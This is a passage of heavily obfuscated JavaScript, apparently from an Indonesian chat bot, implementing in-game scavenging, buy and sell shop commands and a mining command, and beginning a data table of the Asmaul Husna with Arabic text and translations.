_0x1ce978[_0x240d04(0x1e7d)](_0x476bfb,_0x240d04(0x1053)+_0x240d04(0x1536)+_0x1ce978[_0x240d04(0xb31)](_0x21f988,_0x5ec953)+(_0x240d04(0x1c1d)+_0x240d04(0x166b)+_0x240d04(0x29b3)));const _0x33395d=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xd2a)](Math[_0x240d04(0x24f1)](),0xf4240)),_0x30b599=Math['floor'](_0x1ce978[_0x240d04(0x1e1c)](Math[_0x240d04(0x24f1)](),0x2710)),_0x5618d2=_0x24bd8f[_0x240d04(0x1e6d)]||0x0,_0x4de8bc=_0x1ce978[_0x240d04(0x279a)](_0x19007e,_0x240d04(0x19c2)),_0x5cfe8d=_0x1ce978[_0x240d04(0x184d)],_0x18f482=[_0x1ce978[_0x240d04(0x1530)],(_0x240d04(0x2561)+_0x240d04(0xe8b)+_0x240d04(0xb40)+_0x240d04(0x1872)+_0x240d04(0x2dea)+_0x240d04(0x1e37)+_0x240d04(0xd54)+_0x240d04(0x106b)+'\x20\x20\x20\x20\x20')['trim'](),(_0x240d04(0x1e30)+_0x240d04(0xf1f)+_0x240d04(0x8f4)+'⬛⬛⬛⬛⬛⬛🚙\x0a🏘️🏘️'+_0x240d04(0xecb)+_0x240d04(0xe90)+_0x240d04(0xa93)+_0x240d04(0x17a8)+_0x240d04(0x1a38))[_0x240d04(0x2d6d)](),(_0x240d04(0x1825)+_0x240d04(0x1fbf)+'⬜🚐⬜⬜⬛🚙🚚🚑\x0a⬛'+_0x240d04(0x32d)+_0x240d04(0x668)+_0x240d04(0x29ea)+_0x240d04(0x1557)+_0x240d04(0x2c73)+_0x240d04(0x1aab)+_0x240d04(0x4b7))[_0x240d04(0x2d6d)](),_0x1ce978[_0x240d04(0x6f2)]],_0x5165bb=(_0x240d04(0x16e1)+_0x240d04(0x17d5)+_0x4de8bc+(_0x240d04(0x15e1)+_0x240d04(0xb7a))+_0x33395d[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+(_0x240d04(0x1392)+'\x20')+_0x30b599+(_0x240d04(0x2dab)+_0x240d04(0xb26)+'\x20+1\x0a➕\x20📥\x20To'+_0x240d04(0x1d1a)+_0x240d04(0x2c15)+_0x240d04(0x164))+_0x5618d2+'\x0a')[_0x240d04(0x2d6d)]();_0x24bd8f[_0x240d04(0xd24)]+=_0x33395d,_0x24bd8f[_0x240d04(0x21ac)]+=_0x30b599,_0x24bd8f[_0x240d04(0x1e6d)]+=0x1,_0x24bd8f[_0x240d04(0x25c4)]=_0x5c6447,await _0x1ce978[_0x240d04(0x18d)](_0x961430,_0x3deda4),global[_0x240d04(0xbe8)][_0xb65b97]=[_0x5cfe8d];let _0x21dd11=0x0;for(let _0x4a55e4=0x0;_0x1ce978['ncziD'](_0x4a55e4,_0x18f482[_0x240d04(0x2b45)]);_0x4a55e4++){if(_0x1ce978[_0x240d04(0x448)](_0x1ce978[_0x240d04(0x1288)],_0x1ce978[_0x240d04(0x1288)]))_0x1ce978[_0x240d04(0x1ea7)](setTimeout,()=>_0x476bfb(_0x18f482[_0x4a55e4]),_0x21dd11),_0x21dd11+=0x1388;else{_0x2ee391=_0x4cf95e[_0x240d04(0x25f7)+'e']();const _0x403448={'money':'💵','exp':'✨','limit':'🎫','potion':'🧪','diamond':'💎','iron':'⛓️','string':_0x1ce978[_0x240d04(0xb2c)],'wood':'🪵','rock':'🪨','sword':'⚔️','pickaxe':'⛏️','fishingrod':'🎣','armor':'🥼','atm':'💳','emerald':'💚','gold':'🪙'},_0x195d52=_0x221202[_0x240d04(0x1adb)](_0x403448)[_0x240d04(0x16e6)](_0x17759a=>[_0x17759a,new _0x2568d8(_0x17759a,'gi')])['filter'](([_0x592083,_0x357a3])=>_0x357a3[_0x240d04(0x1dc7)](_0xbb5800));if(!_0x195d52[_0x240d04(0x2b45)])return'';return _0x403448[_0x195d52[0x0][0x0]];}}_0x1ce978[_0x240d04(0x2dbf)](setTimeout,()=>{const _0x5bf8bb=_0x240d04;_0x476bfb(_0x5165bb),delete global[_0x5bf8bb(0xbe8)][_0xb65b97];},_0x21dd11+0x3e8);}catch(_0x44232e){console['error'](_0x44232e),_0x1ce978[_0x240d04(0xaea)](_0x476bfb,_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x1d8e)+_0x240d04(0xa9a)+_0x240d04(0x892));}}break;case _0x1ce978[_0x240d04(0x66c)]:{if(_0x1ce978[_0x240d04(0x2965)](_0x1ce978[_0x240d04(0xd04)],_0x1ce978[_0x240d04(0x2bed)])){function _0x579538(_0x35c94d){const _0x3f34a6=_0x240d04;var _0x46e71a=Math[_0x3f34a6(0xf02)](_0x1ce978[_0x3f34a6(0x1f9c)](_0x1ce978['ZXsLX'](_0x35c94d,0x3e8),0x3c)),_0x335ed9=Math[_0x3f34a6(0xf02)](_0x1ce978[_0x3f34a6(0x252)](_0x35c94d/_0x1ce978[_0x3f34a6(0x21f1)](0x3e8,0x3c),0x3c)),_0x4be045=Math[_0x3f34a6(0xf02)](_0x1ce978[_0x3f34a6(0x558)](_0x1ce978['lHtqH'](_0x35c94d,_0x1ce978[_0x3f34a6(0x2ab5)](0x3e8,0x3c)*0x3c),0x18));return _0x4be045[_0x3f34a6(0x2cb7)]()['padStart'](0x2,'0')+'\x20jam\x20'+_0x335ed9['toString']()['padStart'](0x2,'0')+_0x3f34a6(0x2eca)+_0x46e71a[_0x3f34a6(0x2cb7)]()[_0x3f34a6(0x1f96)](0x2,'0')+_0x3f34a6(0x20ee);}try{if(_0x1ce978[_0x240d04(0x1bec)](_0x240d04(0x28cc),_0x240d04(0x21ea)))return _0x2288d9(_0x1ce978[_0x240d04(0x24a8)]);else{const _0x4a4214=await _0x1ce978[_0x240d04(0x12cc)](_0x182219),_0x5448ef=_0x4a4214[_0xb65b97]=_0x4a4214[_0xb65b97]||{'money':0x0,'lastkerja':0x0,'lastbansos':0x0,'lastmisi':0x0,'lastmulung':0x0,'botol':0x0,'kaleng':0x0,'kardus':0x0,'gelas':0x0,'plastik':0x0};if(!_0x5448ef||!_0x5448ef['nama']||!_0x5448ef['umur'])return _0x476bfb('⚠️\x20Kamu\x20bel'+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+'\x20untuk\x20mul'+_0x240d04(0x2d8a));_0x5448ef[_0x240d04(0x2ca2)]=_0x5448ef[_0x240d04(0x2ca2)]||0x0,_0x5448ef[_0x240d04(0x2d9a)]=_0x5448ef[_0x240d04(0x2d9a)]||0x0,_0x5448ef[_0x240d04(0xaef)]=_0x5448ef[_0x240d04(0xaef)]||0x0,_0x5448ef[_0x240d04(0x10a0)]=_0x5448ef['gelas']||0x0,_0x5448ef[_0x240d04(0x1a98)]=_0x5448ef[_0x240d04(0x1a98)]||0x0,_0x5448ef['lastmulung']=_0x5448ef[_0x240d04(0x56f)]||0x0;if(_0x5448ef[_0x240d04(0x2344)])return _0x476bfb(_0x1ce978[_0x240d04(0x17c4)]);const _0x1982b5=Date[_0x240d04(0x104e)](),_0x23be77=_0x1ce978[_0x240d04(0xe06)](_0x1ce978['qeTUa'](0x1e,0x3c),0x3e8),_0x4761bb=_0x1ce978['BzkXz'](_0x5448ef[_0x240d04(0x56f)],_0x23be77)-_0x1982b5;if(_0x1ce978[_0x240d04(0x22ef)](_0x4761bb,0x0))return _0x1ce978[_0x240d04(0x2aad)](_0x476bfb,_0x240d04(0x2e7f)+_0x240d04(0x11d9)+_0x240d04(0x8b3)+_0x240d04(0xf40)+_0x240d04(0x1536)+_0x579538(_0x4761bb)+(_0x240d04(0x641)+_0x240d04(0x1202)+'i.'));const _0x3a82ed=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1b15)](Math[_0x240d04(0x24f1)](),0x3e8)),_0x2d4936=Math[_0x240d04(0xf02)](Math['random']()*0x3e8),_0x369f9a=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1e1c)](Math['random'](),0x3e8)),_0x487325=Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*0x3e8),_0x5e2168=Math[_0x240d04(0xf02)](_0x1ce978['mknlG'](Math[_0x240d04(0x24f1)](),0x3e8));return _0x5448ef['botol']+=_0x3a82ed,_0x5448ef[_0x240d04(0x2d9a)]+=_0x2d4936,_0x5448ef[_0x240d04(0xaef)]+=_0x369f9a,_0x5448ef['gelas']+=_0x487325,_0x5448ef['plastik']+=_0x5e2168,_0x5448ef[_0x240d04(0x56f)]=_0x1982b5,await _0x1ce978[_0x240d04(0x5fb)](_0x961430,_0x4a4214),_0x476bfb(_0x240d04(0x2085)+'ung:*\x0a+\x20'+_0x3a82ed+_0x240d04(0x2652)+_0x2d4936+_0x240d04(0x18aa)+_0x369f9a+_0x240d04(0x2e79)+_0x487325+_0x240d04(0x17e4)+_0x5e2168+_0x240d04(0x169c));}}catch(_0x24b6cc){return console[_0x240d04(0x15e)](_0x24b6cc),_0x1ce978[_0x240d04(0x980)](_0x476bfb,_0x1ce978[_0x240d04(0x1d60)]);}}else return _0x1ce978[_0x240d04(0x1f55)](_0x49682d,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+'\x20nama.umur'+_0x240d04(0x163d)+_0x240d04(0x2d8a));}break;case _0x1ce978['jKcka']:{if(_0x1ce978[_0x240d04(0x1d93)](_0x1ce978['FQwgW'],_0x1ce978[_0x240d04(0xd5f)]))_0x2a1de4[_0x240d04(0x2c90)]['text']=_0x65bcae,_0x3ee463=!![];else{const _0x5da34e=_0x25a360=>{const _0x37403a=_0x240d04;return _0x1ce978['FpNka'](_0x1ce978[_0x37403a(0x2c8b)],_0x1ce978['zDQkJ'])?(_0x25a360=_0x1ce978[_0x37403a(0x980)](parseInt,_0x25a360),_0x1ce978[_0x37403a(0x11b)](typeof _0x25a360,_0x1ce978[_0x37403a(0xf5e)])&&!isNaN(_0x25a360)):_0x3f643b[_0x37403a(0xf02)](0.3*_0xa80ff8[_0x37403a(0x18fd)](_0x1975b0));},_0x3fa36a=_0x25056e=>{const _0x57f40e=_0x240d04,_0x55f642={'money':'💰','exp':'✨','chip':'🎫','potion':'🧪','trash':_0x57f40e(0x2ad8),'wood':'🪵','rock':'🪨','string':'🧵','iron':'⛓️','gold':'🥇','diamond':'💎','emerald':'🟢','common':'📦','uncommon':'🎁','mythic':'🧿','legendary':'👑','pet':'🐶','petfood':'🍗','umpan':'🐟','pisang':'🍌','anggur':'🍇','apel':'🍎','jeruk':'🍊','mangga':'🥭','bibitpisang':_0x1ce978[_0x57f40e(0xadc)],'bibitanggur':_0x1ce978[_0x57f40e(0x1cd)],'bibitapel':_0x1ce978['ZvfpB'],'bibitjeruk':_0x57f40e(0xea9),'bibitmangga':_0x57f40e(0x2c87)};return _0x55f642[_0x25056e]||'';};try{if(_0x240d04(0x1298)!==_0x1ce978[_0x240d04(0x2c63)])_0x60a1b5(_0x219b9b,_0x551b12[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{const _0x55c002=await _0x1ce978[_0x240d04(0x50b)](_0x182219),_0x70842=_0x55c002[_0xb65b97]=_0x55c002[_0xb65b97]||{'money':0x0,'exp':0x0};if(!_0x70842||!_0x70842[_0x240d04(0x2eea)]||!_0x70842[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x1311)](_0x476bfb,'⚠️\x20Kamu\x20bel'+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+'\x20untuk\x20mul'+_0x240d04(0x2d8a));if(_0x70842[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x2ee5)](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);const _0x50093c={'chip':{'money':0xf4240},'exp':{'money':0x3e8},'potion':{'money':0x4e2},'trash':{'money':0x28},'wood':{'money':0x2bc},'rock':{'money':0x352},'string':{'money':0x190},'iron':{'money':0xbb8},'diamond':{'money':0x7a120},'emerald':{'money':0x186a0},'gold':{'money':0x186a0},'common':{'money':0x7d0},'uncommon':{'money':0x4e20},'mythic':{'money':0x124f8},'legendary':{'money':0x30d40},'petfood':{'money':0xdac},'pet':{'money':0x1d4c0},'anggur':{'money':0x7d0},'apel':{'money':0x7d0},'jeruk':{'money':0x7d0},'mangga':{'money':0x7d0},'pisang':{'money':0x7d0},'bibitanggur':{'money':0x7d0},'bibitapel':{'money':0x7d0},'bibitjeruk':{'money':0x7d0},'bibitmangga':{'money':0x7d0},'bibitpisang':{'money':0x7d0},'umpan':{'money':0x1388}},_0x59d128=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0x50b53a=_0x1ce978[_0x240d04(0x80a)](_0x5da34e,_0x483c03[0x1])?Math[_0x240d04(0x1c2f)](0x1,_0x1ce978[_0x240d04(0xa99)](parseInt,_0x483c03[0x1])):0x1;if(!_0x59d128||!_0x1ce978[_0x240d04(0xe00)](_0x59d128,_0x50093c)){if(_0x240d04(0x2b53)===_0x1ce978[_0x240d04(0x2055)]){const _0x42ae5e=_0x12b765['message'][_0x240d04(0x19ed)]['id'];_0x1ce978[_0x240d04(0x64a)](_0x4a221a,_0x2fb3d0(_0x42ae5e)?_0x1ce978[_0x240d04(0x1718)]:_0x240d04(0x9a0)+'\x20d=ibanned'+'.');}else{const _0x5e9277=_0x1ce978['ltvQn'](_0x1ce978[_0x240d04(0x1292)](_0x240d04(0xe71)+_0x240d04(0xa9b)+_0x240d04(0x1152)+_0x240d04(0x2414),Object['entries'](_0x50093c)['map'](([_0x278a68,_0x4b6a28])=>{const _0x34b011=_0x240d04;if(_0x1ce978[_0x34b011(0x1607)](_0x1ce978[_0x34b011(0x2a79)],_0x34b011(0xb91))){const _0x4e9bd4=_0x1ead02['floor'](_0x1ce978['gaCKu'](_0xde1c0e,1.5));_0x1feede[_0x10f0c7]+=_0x4e9bd4,_0x2753fe=_0x34b011(0x1569)+_0x34b011(0x1131)+_0x34b011(0xd9e)+'an\x20*+'+_0x4e9bd4+'\x20'+_0x2ead3d(_0x2926d5)+'*';}else{let _0x298b57=Object[_0x34b011(0x1adb)](_0x4b6a28)[0x0];return _0x34b011(0x2adb)+_0x1ce978[_0x34b011(0x276)](_0x3fa36a,_0x278a68)+'\x20*'+_0x2ca95e(_0x278a68)+_0x34b011(0x19ce)+_0x4b6a28[_0x298b57]+'\x20'+_0x1ce978['OUjnc'](_0x3fa36a,_0x298b57)+'\x20'+_0x1ce978[_0x34b011(0x16d3)](_0x2ca95e,_0x298b57)+'*';}})[_0x240d04(0x86e)]('\x0a')),_0x240d04(0x243)+'\x20*buy\x20[ite'+_0x240d04(0x13fe)+']*\x0aContoh:'+'\x20*buy\x20poti'+_0x240d04(0x25df));return _0x1ce978[_0x240d04(0x2751)](_0x476bfb,_0x5e9277);}}const _0x272e21=_0x50093c[_0x59d128],_0x5298d0=Object[_0x240d04(0x1adb)](_0x272e21)[0x0],_0x456aeb=_0x1ce978[_0x240d04(0xe06)](_0x272e21[_0x5298d0],_0x50b53a);if(_0x1ce978[_0x240d04(0x1bec)](_0x70842[_0x5298d0],undefined)||_0x70842[_0x5298d0]<_0x456aeb)return _0x1ce978['tlrvq'](_0x476bfb,_0x240d04(0x239e)+'u\x20tidak\x20cu'+_0x240d04(0x92c)+_0x240d04(0x1572)+_0x456aeb+'\x20'+_0x1ce978['bkpOu'](_0x2ca95e,_0x5298d0)+(_0x240d04(0x1a2)+_0x240d04(0x177f)+'*')+(_0x70842[_0x5298d0]||0x0)+'*.');return _0x70842[_0x5298d0]-=_0x456aeb,_0x70842[_0x59d128]=_0x1ce978[_0x240d04(0x2071)](_0x70842[_0x59d128]||0x0,_0x50b53a),await _0x1ce978['yJdBK'](_0x961430,_0x55c002),_0x1ce978[_0x240d04(0xd90)](_0x476bfb,_0x240d04(0x1014)+_0x240d04(0x1b33)+_0x50b53a+'\x20'+_0x1ce978[_0x240d04(0xed7)](_0x2ca95e,_0x59d128)+'\x20'+_0x1ce978[_0x240d04(0xcce)](_0x3fa36a,_0x59d128)+(_0x240d04(0x2699)+'*')+_0x456aeb+'\x20'+_0x2ca95e(_0x5298d0)+'\x20'+_0x1ce978[_0x240d04(0x283f)](_0x3fa36a,_0x5298d0)+'*');}}catch(_0x1f0835){return console[_0x240d04(0x15e)](_0x1f0835),_0x476bfb('Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0x952)+'.');}}}break;case _0x1ce978[_0x240d04(0x1bc)]:{if(_0x1ce978[_0x240d04(0x9ce)](_0x240d04(0x118b),_0x1ce978[_0x240d04(0x1a31)])){const _0x34a2c5=_0x9f35f9=>{const _0x2510b4=_0x240d04,_0x1fbf71={'ElfZD':_0x1ce978[_0x2510b4(0x1453)]};return _0x1ce978[_0x2510b4(0x2c7d)](_0x2510b4(0x1d78),'VWzLf')?_0xdd718a(_0x1fbf71[_0x2510b4(0x2038)]):(_0x9f35f9=parseInt(_0x9f35f9),_0x1ce978['kmtUo'](typeof _0x9f35f9,_0x1ce978[_0x2510b4(0xf5e)])&&!isNaN(_0x9f35f9));},_0x444001=_0x55a2f0=>{const _0x4c75b0=_0x240d04,_0x4d352c={'money':'💰','exp':'✨','chip':'🎫','potion':'🧪','trash':_0x1ce978[_0x4c75b0(0x1919)],'wood':'🪵','rock':'🪨','string':'🧵','iron':'⛓️','gold':'🥇','diamond':'💎','emerald':'🟢','common':'📦','uncommon':'🎁','mythic':'🧿','legendary':'👑','pet':'🐶','petfood':'🍗','umpan':'🐟','pisang':'🍌','anggur':'🍇','apel':'🍎','jeruk':'🍊','mangga':'🥭','bibitpisang':'🌱🍌','bibitanggur':_0x1ce978[_0x4c75b0(0x1cd)],'bibitapel':_0x4c75b0(0x1ad7),'bibitjeruk':_0x4c75b0(0xea9),'bibitmangga':_0x1ce978[_0x4c75b0(0x2192)]};return _0x4d352c[_0x55a2f0]||'';};try{if(_0x1ce978[_0x240d04(0x207c)](_0x240d04(0x278c),_0x1ce978['cYcJC'])){const _0x2f4095=await _0x182219(),_0x1739cb=_0x2f4095[_0xb65b97]=_0x2f4095[_0xb65b97]||{'money':0x0};if(!_0x1739cb||!_0x1739cb[_0x240d04(0x2eea)]||!_0x1739cb[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0x1ba4)]!==_0x1ce978[_0x240d04(0x1fb1)])return _0x1ce978[_0x240d04(0xd08)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);else _0x427d20['error'](_0x364ae5),_0x2215b6(_0x1ce978['ldozy']);}if(_0x1739cb[_0x240d04(0x2344)]){if(_0x1ce978[_0x240d04(0xd0d)](_0x240d04(0x1b89),_0x1ce978[_0x240d04(0x2728)]))return _0x476bfb(_0x1ce978[_0x240d04(0x17c4)]);else _0x336c6e[_0x4f5a0a]=_0x1ce978[_0x240d04(0x29ce)](_0x5e8713[_0x1627e4]||0x0,_0x4b0163[_0x23de60]),_0x367447+='*+'+_0x131f35[_0x9cbe59]+'*\x20'+_0xfb83cb[_0x240d04(0x1fc7)](_0x42b64d)+'\x20'+_0x4a3dea+'\x0a';}const _0x40380f={'chip':{'money':0xf4240},'exp':{'money':0x1},'potion':{'money':0x271},'trash':{'money':0x14},'wood':{'money':0x15e},'rock':{'money':0x1a9},'string':{'money':0xc8},'iron':{'money':0x5dc},'diamond':{'money':0x3d090},'emerald':{'money':0xc350},'gold':{'money':0xc350},'common':{'money':0x3e8},'uncommon':{'money':0x2710},'mythic':{'money':0x927c},'legendary':{'money':0x186a0},'petfood':{'money':0x6d6},'pet':{'money':0xea60},'anggur':{'money':0x3e8},'apel':{'money':0x3e8},'jeruk':{'money':0x3e8},'mangga':{'money':0x3e8},'pisang':{'money':0x3e8},'bibitanggur':{'money':0x3e8},'bibitapel':{'money':0x3e8},'bibitjeruk':{'money':0x3e8},'bibitmangga':{'money':0x3e8},'bibitpisang':{'money':0x3e8},'umpan':{'money':0x9c4}},_0x1fca8a=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0x22f319=_0x1ce978[_0x240d04(0x271a)](_0x34a2c5,_0x483c03[0x1])?Math['max'](0x1,_0x1ce978[_0x240d04(0x2ab4)](parseInt,_0x483c03[0x1])):0x1;if(!_0x1fca8a||!_0x1ce978[_0x240d04(0x28f4)](_0x1fca8a,_0x40380f)){const _0x13bacb=_0x1ce978[_0x240d04(0x109f)](_0x1ce978['pGviW'](_0x240d04(0xec6)+_0x240d04(0xa9b)+_0x240d04(0x655)+_0x240d04(0x23c8),Object[_0x240d04(0x1121)](_0x40380f)[_0x240d04(0x16e6)](([_0x4460f6,_0x186169])=>{const _0x8c8b0a=_0x240d04;let _0x2b4a6d=Object['keys'](_0x186169)[0x0];return _0x8c8b0a(0x2adb)+_0x444001(_0x4460f6)+'\x20*'+_0x1ce978[_0x8c8b0a(0x2590)](_0x2ca95e,_0x4460f6)+_0x8c8b0a(0x19ce)+_0x186169[_0x2b4a6d]+'\x20'+_0x1ce978[_0x8c8b0a(0x191c)](_0x444001,_0x2b4a6d)+'\x20'+_0x2ca95e(_0x2b4a6d)+'*';})[_0x240d04(0x86e)]('\x0a')),_0x240d04(0x243)+_0x240d04(0x1170)+_0x240d04(0x122c)+_0x240d04(0x182)+_0x240d04(0x1c50)+_0x240d04(0x1bf8));return _0x1ce978['RtHOm'](_0x476bfb,_0x13bacb);}const _0x410f7a=_0x40380f[_0x1fca8a],_0x3833e1=Object['keys'](_0x410f7a)[0x0],_0x5d4cd6=_0x1ce978[_0x240d04(0x26b)](_0x410f7a[_0x3833e1],_0x22f319);if((_0x1739cb[_0x1fca8a]||0x0)<_0x22f319)return _0x1ce978['mIEtl']('dkstY','dkstY')?_0x1ce978['WsRzO'](_0x33f568,_0x240d04(0xecc)+_0x240d04(0x23ea)+_0x240d04(0x1309)+_0x240d04(0x24a2)+_0x240d04(0x2163)+_0x240d04(0x951)+'rah.'):_0x1ce978[_0x240d04(0x18e9)](_0x476bfb,'❌\x20Kamu\x20tid'+'ak\x20punya\x20c'+'ukup\x20*'+_0x1ce978[_0x240d04(0x240b)](_0x2ca95e,_0x1fca8a)+(_0x240d04(0x2441)+'jual!\x0aJuml'+_0x240d04(0x56a))+(_0x1739cb[_0x1fca8a]||0x0)+'*');return _0x1739cb[_0x1fca8a]-=_0x22f319,_0x1739cb[_0x3833e1]=(_0x1739cb[_0x3833e1]||0x0)+_0x5d4cd6,await _0x1ce978[_0x240d04(0x4ab)](_0x961430,_0x2f4095),_0x1ce978['qFJsA'](_0x476bfb,_0x240d04(0x1014)+'enjual\x20*'+_0x22f319+'\x20'+_0x1ce978[_0x240d04(0x2c94)](_0x2ca95e,_0x1fca8a)+'\x20'+_0x444001(_0x1fca8a)+_0x240d04(0x9ac)+_0x5d4cd6+'\x20'+_0x1ce978[_0x240d04(0x11da)](_0x2ca95e,_0x3833e1)+'\x20'+_0x1ce978[_0x240d04(0x2bfe)](_0x444001,_0x3833e1)+'*');}else _0x1ce978['QMFwm'](_0x3a65d2,'⏱️\x20Waktu\x20ha'+'bis!\x20Jawab'+_0x240d04(0x26d4)+_0x1ce978['LNfjT'](_0x12832d,_0x359879)+'*'),delete _0x370465[_0x188a4d];}catch(_0x3709c4){return console['error'](_0x3709c4),_0x476bfb(_0x1ce978[_0x240d04(0x1281)]);}}else return _0x1ce978[_0x240d04(0x13a4)](_0x27ea83,_0x1ce978[_0x240d04(0x257a)]);}break;case'mining':{Array[_0x240d04(0x9cb)][_0x240d04(0xaaa)]=function(){const _0x571e6a=_0x240d04;return this[Math[_0x571e6a(0xf02)](_0x1ce978['ymOEq'](Math[_0x571e6a(0x24f1)](),this[_0x571e6a(0x2b45)]))];},Number[_0x240d04(0x9cb)]['getRandom']=function(){const _0x1c1996=_0x240d04;if(_0x1ce978['scrZu'](_0x1ce978[_0x1c1996(0x1c32)],_0x1ce978[_0x1c1996(0x2c50)]))return Math['floor'](Math['random']()*this);else{_0x230ec6[_0x1c1996(0x2c57)+'a']={'result':{'data':[{'index':'1','latin':_0x1ce978['bUfNk'],'arabic':_0x1ce978[_0x1c1996(0xf7c)],'translation_id':_0x1ce978[_0x1c1996(0x2191)],'translation_en':_0x1ce978[_0x1c1996(0x2078)]},{'index':'2','latin':_0x1ce978[_0x1c1996(0xae1)],'arabic':_0x1c1996(0x1316),'translation_id':_0x1ce978[_0x1c1996(0x27f4)],'translation_en':_0x1ce978[_0x1c1996(0x2855)]},{'index':'3','latin':_0x1ce978['pEqgc'],'arabic':_0x1c1996(0x757),'translation_id':_0x1ce978['Dnvva'],'translation_en':_0x1ce978[_0x1c1996(0x236c)]},{'index':'4','latin':_0x1ce978['FUKfQ'],'arabic':_0x1ce978[_0x1c1996(0x25ee)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0x16cc)+'i','translation_en':_0x1ce978['HKcsU']},{'index':'5','latin':_0x1c1996(0xde0),'arabic':_0x1c1996(0x99c),'translation_id':_0x1ce978[_0x1c1996(0x204d)],'translation_en':_0x1ce978[_0x1c1996(0xe9a)]},{'index':'6','latin':_0x1ce978[_0x1c1996(0x2815)],'arabic':_0x1ce978['eLdgG'],'translation_id':_0x1ce978[_0x1c1996(0x2215)],'translation_en':_0x1ce978[_0x1c1996(0x194f)]},{'index':'7','latin':_0x1ce978[_0x1c1996(0xfd7)],'arabic':_0x1ce978['iCodw'],'translation_id':_0x1c1996(0x28d2)+'iki\x20Mutlak'+_0x1c1996(0x2bd0)+'elihara','translation_en':_0x1ce978[_0x1c1996(0x611)]},{'index':'8','latin':_0x1ce978[_0x1c1996(0x23af)],'arabic':_0x1ce978[_0x1c1996(0x167)],'translation_id':_0x1ce978['FoOGU'],'translation_en':_0x1c1996(0x1883)+_0x1c1996(0x30c)+_0x1c1996(0x16dd)+_0x1c1996(0x2ee7)},{'index':'9','latin':_0x1c1996(0x33a),'arabic':_0x1ce978['GYHKJ'],'translation_id':'Yang\x20Memil'+'iki\x20Mutlak'+_0x1c1996(0x1d4a)+_0x1c1996(0x1197),'translation_en':_0x1ce978[_0x1c1996(0xca4)]},{'index':'10','latin':_0x1ce978[_0x1c1996(0x4c8)],'arabic':_0x1ce978[_0x1c1996(0x26c3)],'translation_id':_0x1ce978[_0x1c1996(0x9d0)],'translation_en':_0x1ce978[_0x1c1996(0x1a56)]},{'index':'11','latin':_0x1ce978['shgWD'],'arabic':_0x1ce978[_0x1c1996(0xe34)],'translation_id':_0x1ce978['SqpvI'],'translation_en':_0x1ce978['xZgAB']},{'index':'12','latin':_0x1ce978[_0x1c1996(0x15e3)],'arabic':_0x1c1996(0x2693),'translation_id':_0x1ce978[_0x1c1996(0x2c3b)],'translation_en':_0x1ce978[_0x1c1996(0xc1)]},{'index':'13','latin':_0x1ce978['ZCfuz'],'arabic':_0x1ce978[_0x1c1996(0x3ee)],'translation_id':_0x1ce978[_0x1c1996(0x2350)],'translation_en':_0x1ce978[_0x1c1996(0x1a42)]},{'index':'14','latin':_0x1ce978[_0x1c1996(0x484)],'arabic':_0x1ce978[_0x1c1996(0x238c)],'translation_id':_0x1ce978['zTojH'],'translation_en':_0x1ce978['FJEdg']},{'index':'15','latin':_0x1ce978['Mhrns'],'arabic':_0x1ce978[_0x1c1996(0x1ad6)],'translation_id':_0x1ce978['pBFfN'],'translation_en':_0x1ce978[_0x1c1996(0xa23)]},{'index':'16','latin':_0x1ce978[_0x1c1996(0xd6f)],'arabic':_0x1ce978[_0x1c1996(0x10b8)],'translation_id':_0x1ce978[_0x1c1996(0x1368)],'translation_en':_0x1ce978['MIpqT']},{'index':'17','latin':_0x1ce978[_0x1c1996(0xfe3)],'arabic':_0x1ce978[_0x1c1996(0x1e2f)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0x2bd0)+_0x1c1996(0x218e)+'i','translation_en':_0x1ce978[_0x1c1996(0x2e27)]},{'index':'18','latin':_0x1ce978[_0x1c1996(0x1829)],'arabic':_0x1ce978[_0x1c1996(0x1558)],'translation_id':_0x1ce978[_0x1c1996(0x2c07)],'translation_en':_0x1ce978[_0x1c1996(0xa2b)]},{'index':'19','latin':_0x1ce978[_0x1c1996(0x9c6)],'arabic':_0x1c1996(0x2857)+'مُ','translation_id':_0x1ce978[_0x1c1996(0xe0e)],'translation_en':'The\x20All\x20Kn'+_0x1c1996(0x2b35)+_0x1c1996(0x2492)+'t'},{'index':'20','latin':_0x1ce978['qCFlu'],'arabic':_0x1ce978[_0x1c1996(0x1f76)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+'\x20sifat\x20Yan'+_0x1c1996(0x152b)+'kan\x20(makhl'+_0x1c1996(0x2747),'translation_en':_0x1ce978['lervy']},{'index':'21','latin':_0x1ce978[_0x1c1996(0x2e1e)],'arabic':_0x1ce978[_0x1c1996(0xe6c)],'translation_id':_0x1ce978[_0x1c1996(0x272f)],'translation_en':'The\x20Expand'+_0x1c1996(0x102a)+_0x1c1996(0x31f)},{'index':'22','latin':_0x1c1996(0x1ff0)+'h','arabic':_0x1ce978[_0x1c1996(0x789)],'translation_id':'Yang\x20Memil'+_0x1c1996(0x18b7)+_0x1c1996(0x99f)+_0x1c1996(0xbf3)+'an\x20(makhlu'+_0x1c1996(0x2c18),'translation_en':_0x1ce978[_0x1c1996(0x1c60)]},{'index':'23','latin':'Ar\x20Raafi’','arabic':_0x1c1996(0x46d),'translation_id':_0x1ce978[_0x1c1996(0x2ecc)],'translation_en':'The\x20Exalte'+'r'},{'index':'24','latin':_0x1ce978[_0x1c1996(0xfae)],'arabic':_0x1ce978[_0x1c1996(0x722)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18